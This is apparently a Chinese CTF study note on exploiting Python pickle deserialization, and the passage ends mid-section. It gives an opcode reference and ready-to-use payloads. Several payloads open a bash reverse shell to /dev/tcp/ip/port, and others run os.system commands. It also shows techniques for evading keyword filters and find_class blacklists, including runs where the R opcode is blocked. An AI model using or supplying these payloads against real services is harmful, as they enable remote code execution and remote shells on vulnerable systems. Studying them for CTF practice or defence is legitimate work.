<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R可用</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i可用  ==》INST</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o可用  ==》OBJ</span><br><span class="line"></span><br><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">特殊情况</span><br><span class="line">无R,i,o,但是os可用</span><br><span class="line">b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;calc&#x27;\nos.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">无R,i,o os  可过关键词过滤（还是比较重要）</span><br><span class="line">b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;\nS&#x27;val1&#x27;\ndS&#x27;vul&#x27;\n(cos\nsystem\nVcalc\nos.&#x27;&#x27;&#x27;</span><br><span class="line">V操作码是可以识别\u ，所以如果过滤了关键字还可以将命令unicode编码也能识别。</span><br></pre></td></tr></table></figure>

<p>注意：如果想拼接的payload就使用\n代表换行，这样才方便生成payload，但是需要注意的就是如果用赛博厨子 会将 \n 当作字符处理，易出错</p>
<p><strong>利用方式：</strong></p>
<p>最好如下在s那里加上encode()，这样才不会因为base64函数问题报str的错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(s.encode()))</span><br></pre></td></tr></table></figure>

<h6 id="绕过显示字符串检测-关键字绕过"><a href="#绕过显示字符串检测-关键字绕过" class="headerlink" title="绕过显示字符串检测-关键字绕过"></a>绕过显示字符串检测-关键字绕过</h6><p><code>V</code>操作符可以进行unicode编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Vsecr\u0065t</span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>

<p><code>S</code>操作符可以识别十六进制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S<span class="string">&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>

<p>等比如过滤os关键字等小绕过可以小部分参考ssti的绕过手法</p>
<p><strong>注意：</strong>其实上述的R指令在现在已经很难生效了，通常都会对指令码进行过滤，需要结合对整个过程的理解来绕过。R被过滤情况下可以尝试其他几种过滤。（但是个人理解，都有一个缺点：<strong>只能执行单一的函数，很难构造复杂的操作</strong>）</p>
<h4 id="稍进阶绕过"><a href="#稍进阶绕过" class="headerlink" title="稍进阶绕过"></a>稍进阶绕过</h4><p>建议看：<a href="https://xz.aliyun.com/t/7012?time__1311=n4+xnD0GDti=d0Ic405+bDyi8Q0Q1OzDRmoD&alichlgref=https://xz.aliyun.com/t/7436?time__1311=n4%252BxnD0G0%253Dit0Q6qGNnmjt%253DDtNi%253DzdD9jDYwD&alichlgref=https%253A%252F%252Fwww.bing.com%252F#toc-0">文章1</a>与<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjt=DtNi=zdD9jDYwD&alichlgref=https://www.bing.com/#toc-10">文章2</a>，并且有docker可以复现。</p>
<h5 id="如何手写opcode"><a href="#如何手写opcode" class="headerlink" title="如何手写opcode"></a>如何手写opcode</h5><p>如何手搓<a href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-5">参考文章</a></p>
<ul>
<li>在CTF中，很<strong>多时候需要一次执行多个函数或一次进行多个指令</strong>，此时就不能光用<code>__reduce__</code>来解决问题（reduce一次只能执行一个函数，当exec等函数被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。</li>
<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。<strong>下文中，所有opcode为版本0的opcode</strong>。</li>
</ul>
<p>常用的opcode如下（还可以在<code>python31\Lib\pickle.py</code>里看到）：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
<p>需要注意的地方：</p>
<ul>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库</li>
</ul>
<p><strong>如何拼接opcode：</strong><br>将第一个pickle流结尾表示结束的<code>.</code>去掉，将第二个pickle流与第一个拼接起来即可。</p>
<h5 id="利用pker工具"><a href="#利用pker工具" class="headerlink" title="利用pker工具"></a>利用pker工具</h5><p>注意：最好在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker</p>
<ul>
<li><p>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%81%E4%BD%9C%E8%80%85%E7%9A%84paper%EF%BC%9A[%E9%80%9A%E8%BF%87AST%E6%9D%A5%E6%9E%84%E9%80%A0Pickle">https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle</a> opcode](<a href="https://xz.aliyun.com/t/7012)%E3%80%82">https://xz.aliyun.com/t/7012)。</a></p>
</li>
<li><p>使用pker，可以很方便地编写<code>pickle opcode</code>（<strong>生成pickle版本0的opcode</strong>）。</p>
</li>
<li><p>pker的实现用到了python的ast（抽象语法树）库</p>
</li>
</ul>
<p><strong>pker可以实现的功能：</strong></p>
<ul>
<li>变量赋值：存在memo中，保存memo下标和变量名即可</li>
<li>函数调用</li>
<li>类型字面量构造</li>
<li>List和dict成员修改</li>
<li>对象成员变量修改</li>
</ul>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<h6 id="pker工具的使用方法"><a href="#pker工具的使用方法" class="headerlink" title="pker工具的使用方法"></a>pker工具的使用方法</h6><ol>
<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">一下module都可以是包含`.`的子module</span><br><span class="line">调用函数时，注意传入的参数类型要和示例一致</span><br><span class="line">对应的opcode会被生成，但并不与pker代码相互等价</span><br><span class="line"></span><br><span class="line">GLOBAL</span><br><span class="line">对应opcode：b&#x27;c&#x27;</span><br><span class="line">huoqu1module下的一个全局对象（没有import的也可以，比如下面的os）：</span><br><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">输入：module,instance(callable、module都是instance)  </span><br><span class="line"></span><br><span class="line">INST</span><br><span class="line">对应opcode：b&#x27;i&#x27;</span><br><span class="line">建立并入栈一个对象（可以执行一个函数）：</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)  </span><br><span class="line">输入：module,callable,para </span><br><span class="line"></span><br><span class="line">OBJ</span><br><span class="line">对应opcode：b&#x27;o&#x27;</span><br><span class="line">建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;) </span><br><span class="line">输入：callable,para</span><br><span class="line"></span><br><span class="line">xxx(xx,...)</span><br><span class="line">对应opcode：b&#x27;R&#x27;</span><br><span class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用） //应该即是reduce方法</span><br><span class="line"></span><br><span class="line">li[0]=321</span><br><span class="line">或</span><br><span class="line">globals_dic[&#x27;local_var&#x27;]=&#x27;hello&#x27;</span><br><span class="line">对应opcode：b&#x27;s&#x27;</span><br><span class="line">更新列表或字典的某项的值</span><br><span class="line"></span><br><span class="line">xx.attr=123</span><br><span class="line">对应opcode：b&#x27;b&#x27;</span><br><span class="line">对xx对象进行属性设置</span><br><span class="line"></span><br><span class="line">return</span><br><span class="line">对应opcode：b&#x27;0&#x27;</span><br><span class="line">出栈（作为pickle.loads函数的返回值）：</span><br><span class="line">return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test=&quot;123&quot;</span><br><span class="line">return test</span><br></pre></td></tr></table></figure>

<p>被解析为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;S&#x27;123&#x27;\np0\n0g0\n.&quot;</span><br></pre></td></tr></table></figure>

<h6 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h6><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;whoami&#x27;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s) # `b&#x27;R&#x27;`调用</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;[module]&#x27;, &#x27;[callable]&#x27;[, par0,par1...])</span><br><span class="line">OBJ(GLOBAL(&#x27;[module]&#x27;, &#x27;[callable]&#x27;)[, par0,par1...])</span><br></pre></td></tr></table></figure>

<p>等如变量覆盖参考指定的文章，遇到题再学</p>
<h6 id="如何自动化构造"><a href="#如何自动化构造" class="headerlink" title="如何自动化构造"></a>如何自动化构造</h6><p>文章已经将得比较清楚了，这里稍微说说，体会一下思想：</p>
<p>如下方式利用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ cat test/code_breaking</span><br><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get = <span class="built_in">getattr</span>(<span class="built_in">dict</span>, <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="built_in">globals</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>)</span><br><span class="line">builtins = <span class="built_in">globals</span>()</span><br><span class="line">__builtins__ = dict_get(builtins, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span> = <span class="built_in">getattr</span>(__builtins__, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">$ python3 pker.py &lt; test/code_breaking</span><br><span class="line"><span class="string">b&#x27;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#x27;get\&#x27;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&#x27;__builtins__\&#x27;\ntRp5\n0g0\n(g5\nS\&#x27;eval\&#x27;\ntRp6\n0g6\n(S\&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\&#x27;\ntR.&#x27;</span></span><br></pre></td></tr></table></figure>



<h5 id="对opcode的利用"><a href="#对opcode的利用" class="headerlink" title="对opcode的利用"></a>对opcode的利用</h5><h6 id="绕过find-class函数"><a href="#绕过find-class函数" class="headerlink" title="绕过find_class函数"></a>绕过find_class函数</h6><p><a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi=oGNDQiiQGkf=6ERiKd4D&alichlgref=https://cn.bing.com/">参考文章</a></p>
<p>上面在对find_class函数说明的时候，已经可以知道一般防护都是在find_class函数上做文章，那么现在稍微说说是如何绕过的：</p>
<p>比如如下限制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br></pre></td></tr></table></figure>

<p>可以对应简单绕过的函数绕过，案例可以尝试使用函数绕过，还是可以看看。</p>
<p><strong>思路一 获取危险函数</strong></p>
<p>和SSTI和沙箱逃逸的思路类似,可以通过构造类对象链调用某些方法中含有危险函数的类实现绕过.我们只需要构造形如<code>builtins.getattr(builtins,&quot;eval&quot;)(command)</code>的payload即可实现绕过</p>
<ul>
<li>利用<code>sys.module</code>获取危险函数</li>
</ul>
<p><code>sys.module</code>是一个全局字典，这个知识点会在学习沙箱逃逸的时候重点学习..<code>sys.modules</code>这个字典的键是模块名,值是模块本身.所以我们可以通过<code>get(sys.modules,&quot;moduleName&quot;)</code>的方法获取危险模块.</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(builtins.dict,&quot;get&quot;)(sys.modules,&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>给pker的输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">mod=GLOBAL(<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;modules&#x27;</span>)</span><br><span class="line">os=get(mod,<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system=<span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>用pker写成opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS&#x27;get&#x27;\ntRp2\n0csys\nmodules\np3\n0g2\n(g3\nS&#x27;os&#x27;\ntRp4\n0g0\n(g4\nS&#x27;system&#x27;\ntRp5\n0g5\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure>



<ul>
<li><h6 id="利用builtins-globals-获取危险函数"><a href="#利用builtins-globals-获取危险函数" class="headerlink" title="利用builtins.globals()获取危险函数."></a>利用<code>builtins.globals()</code>获取危险函数.</h6></li>
</ul>
<p>还可以用builtins的<code>globals()</code>方法获取危险函数.<code>globals()</code>方法返回一个字典</p>
<blockquote>
<p>返回的字典包含了所有全局作用域内的名称（键）及其对应的值（值）.这个字典反映了当前模块全局命名空间的状态</p>
</blockquote>
<p>其中固然也包含了一些危险模块.</p>
<p>pker的输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">globa1=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;globals&quot;</span>)</span><br><span class="line">glob=globa1()</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;dict&quot;</span>)</span><br><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;getattr&quot;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&quot;get&quot;</span>)</span><br><span class="line">builtins=get(glob,<span class="string">&quot;__builtins__&quot;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&quot;eval&quot;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>生成的opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output=<span class="string">b&#x27;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS\&#x27;get\&#x27;\ntRp4\n0g4\n(g1\nS\&#x27;__builtins__\&#x27;\ntRp5\n0g3\n(g5\nS\&#x27;eval\&#x27;\ntRp6\n0g6\n(S\&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\&#x27;\ntR.&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>R</code>操作符被过滤时,可以使用如下payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;calc&quot;)o00.</span></span><br></pre></td></tr></table></figure>



<ul>
<li>还有未知模块的payload:</li>
</ul>
<p>如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p0                    #取到 getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)Rp2                  # getattr(dict, &#x27;get&#x27;)</span></span><br><span class="line"><span class="string">00g1</span></span><br><span class="line"><span class="string">(g2</span></span><br><span class="line"><span class="string">S&#x27;__builtins__&#x27;       # get(__import__(&#x27;builtins&#x27;).globals(), &#x27;__builtins__&#x27;)</span></span><br><span class="line"><span class="string">tRp3</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;    # 取到 eval 然后实现 RCE</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>同时限制R指令时可以使用下面的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;</span></span><br><span class="line"><span class="comment">#最后两个0是栈为空，否则会报错</span></span><br></pre></td></tr></table></figure>

<p>在pycharm上测试不知道为啥whami可以执行，但是就是不能执行dir（后面有题再测试一下）</p>
<h6 id="R指令被过滤"><a href="#R指令被过滤" class="headerlink" title="R指令被过滤"></a>R指令被过滤</h6><p>除了<code>o</code>、<code>i</code>，还可以使用<code>b</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br></pre></td></tr></table></figure>

<p>代码跟进<a href="https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBKfdLAAh2x7Kx&alichlgref=https://cn.bing.com/">参考文章</a></p>
<p>利用示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age</span>):</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;calc&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p=pickle.loads(opcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="利用python内置函数绕过"><a href="#利用python内置函数绕过" class="headerlink" title="利用python内置函数绕过"></a>利用python内置函数绕过</h6><p>题目参考 <strong>美团CTF 2022 ezpickle</strong> 和 蓝帽杯2022 file_session和HITB Python_revenge writeup</p>
<p>可以利用map函数和filter函数</p>
<p>注意这两个函数都返回一个迭代器,所以我们需要使用<code>list()</code>函数将其变为一个列表输出.</p>
<p>payload如下：</p>
